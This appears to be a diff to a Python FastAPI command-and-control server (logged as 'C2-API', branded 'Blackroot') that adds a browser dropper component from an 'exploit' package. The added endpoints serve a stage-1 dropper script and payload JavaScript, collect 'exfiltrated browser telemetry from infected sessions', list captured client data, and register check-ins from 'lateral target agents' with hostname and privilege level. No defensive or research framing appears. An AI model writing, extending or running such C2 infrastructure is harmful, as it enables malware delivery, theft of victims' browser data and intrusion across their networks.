@@ -15,10 +15,37 @@ from typing import Dict, Any, Optional
 # --- Path setup ---
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "assimilate", "src")))
 
-# --- FastAPI & CORS ---
-from fastapi import FastAPI, HTTPException, Request
-from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import Response
+# --- FastAPI & CORS (with graceful fallback if not installed) ---
+try:
+    from fastapi import FastAPI, HTTPException, Request
+    from fastapi.middleware.cors import CORSMiddleware
+    from fastapi.responses import Response, JSONResponse
+    HAS_FASTAPI = True
+except ImportError:
+    HAS_FASTAPI = False
+    class FastAPI:
+        def __init__(self, *args, **kwargs): pass
+        def add_middleware(self, *args, **kwargs): pass
+        def on_event(self, *args, **kwargs):
+            def dec(fn): return fn
+            return dec
+        def get(self, *args, **kwargs):
+            def dec(fn): return fn
+            return dec
+        def post(self, *args, **kwargs):
+            def dec(fn): return fn
+            return dec
+        def exception_handler(self, *args, **kwargs):
+            def dec(fn): return fn
+            return dec
+    class HTTPException(Exception):
+        def __init__(self, status_code=500, detail=""):
+            self.status_code = status_code
+            self.detail = detail
+    class Request: pass
+    class Response: pass
+    class JSONResponse: pass
+    class CORSMiddleware: pass
 
 # --- Logging ---
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [C2-API] %(message)s")
@@ -130,6 +157,14 @@ class LazyComponents:
         except Exception as e:
             logger.warning(f"[⚠️] SecureControlPlane init failed: {e}")
             self.secure_cp = None
+
+        try:
+            from exploit.browser_dropper import BrowserDropperServer
+            self.dropper = BrowserDropperServer(host="127.0.0.1", port=0)
+            logger.info("[✓] BrowserDropperServer initialized")
+        except Exception as e:
+            logger.warning(f"[⚠️] BrowserDropperServer init failed: {e}")
+            self.dropper = None
         
         self._initialized = True
         logger.info("[✓] All C2 API components initialized")
@@ -500,6 +535,98 @@ async def c2_stealth():
         "threat_level": 0.25,
         "timestamp": datetime.now().isoformat()
     }
+
+# ============================================================================
+# BROWSER PAYLOAD DELIVERY & C2 CHANNELS (Phase 6)
+# ============================================================================
+
+@app.post("/browser/callback")
+async def browser_callback(request: Request):
+    """Receive and record exfiltrated browser telemetry from infected sessions."""
+    _components.init()
+    try:
+        body = await request.json() if hasattr(request, "json") else {}
+        client_host = getattr(request, "client", None)
+        client_ip = getattr(client_host, "host", "unknown") if client_host else "unknown"
+        
+        record = {
+            "timestamp": datetime.utcnow().isoformat(),
+            "client_ip": client_ip,
+            "payload": body
+        }
+        if _components.dropper:
+            _components.dropper.record_telemetry(record)
+        
+        logger.info(f"[C2-BROWSER] Ingested telemetry from {client_ip} (type: {body.get('type', 'unknown')})")
+        return {"status": "ok", "ack": True, "timestamp": datetime.utcnow().isoformat()}
+    except Exception as e:
+        logger.error(f"[C2-BROWSER] Callback processing failed: {e}")
+        return {"status": "error", "message": str(e)}
+
+@app.get("/browser/dropper.js")
+async def browser_dropper_script(request: Request):
+    """Generate dynamic stage-1 browser dropper script."""
+    _components.init()
+    host_header = request.headers.get("Host", f"127.0.0.1:{C2_PORT}") if hasattr(request, "headers") else f"127.0.0.1:{C2_PORT}"
+    base_url = f"http://{host_header}"
+    if _components.dropper:
+        content = _components.dropper.generate_dropper_script(base_url)
+    else:
+        content = f"// Blackroot Dropper fallback\nconsole.log('[Blackroot] C2 at {base_url}');"
+    return Response(content=content, media_type="application/javascript; charset=utf-8")
+
+@app.get("/browser/payloads/{name}")
+async def browser_payload(name: str):
+    """Serve specific browser payload JavaScript from exploit directory."""
+    exploit_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exploit")
+    clean_name = os.path.basename(name)
+    filepath = os.path.join(exploit_dir, clean_name)
+    
+    if os.path.isfile(filepath):
+        with open(filepath, "r", encoding="utf-8", errors="replace") as f:
+            code = f.read()
+        return Response(content=code, media_type="application/javascript; charset=utf-8")
+    raise HTTPException(status_code=404, detail=f"Payload '{clean_name}' not found")
+
+@app.get("/browser/telemetry")
+async def browser_telemetry():
+    """Retrieve captured browser sessions and exfiltrated client data."""
+    _components.init()
+    items = _components.dropper.get_telemetry() if _components.dropper else []
+    return {"count": len(items), "items": items, "timestamp": datetime.utcnow().isoformat()}
+
+# In-memory target checkins registry for lateral movement confirmation
+_lateral_checkins: Dict[str, Any] = {}
+
+@app.post("/c2/agent/checkin")
+async def agent_checkin(request: Request):
+    """Receive check-in confirmation from newly deployed lateral target agents."""
+    try:
+        data = await request.json() if hasattr(request, "json") else {}
+        client_host = getattr(request, "client", None)
+        client_ip = data.get("ip") or (getattr(client_host, "host", "unknown") if client_host else "unknown")
+        agent_id = data.get("agent_id") or f"agent_{int(time.time())}"
+        
+        entry = {
+            "agent_id": agent_id,
+            "ip": client_ip,
+            "hostname": data.get("hostname", "unknown"),
+            "platform": data.get("platform", "unknown"),
+            "privilege": data.get("privilege", "User"),
+            "timestamp": datetime.utcnow().isoformat()
+        }
+        _lateral_checkins[client_ip] = entry
+        _lateral_checkins[agent_id] = entry
+        logger.info(f"[C2] Lateral target checkin confirmed from {client_ip} (id={agent_id}, priv={entry['privilege']})")
+        return {"status": "ok", "registered": True, "agent_id": agent_id}
+    except Exception as e:
+        logger.error(f"[C2] Checkin failed: {e}")
+        return {"status": "error", "message": str(e)}
+
+@app.get("/c2/agent/checkins")
+async def get_agent_checkins():
+    """List all verified lateral target check-ins."""
+    return {"total": len(_lateral_checkins), "checkins": list(_lateral_checkins.values())}
 
 # ============================================================================
 # ROOT ENDPOINT
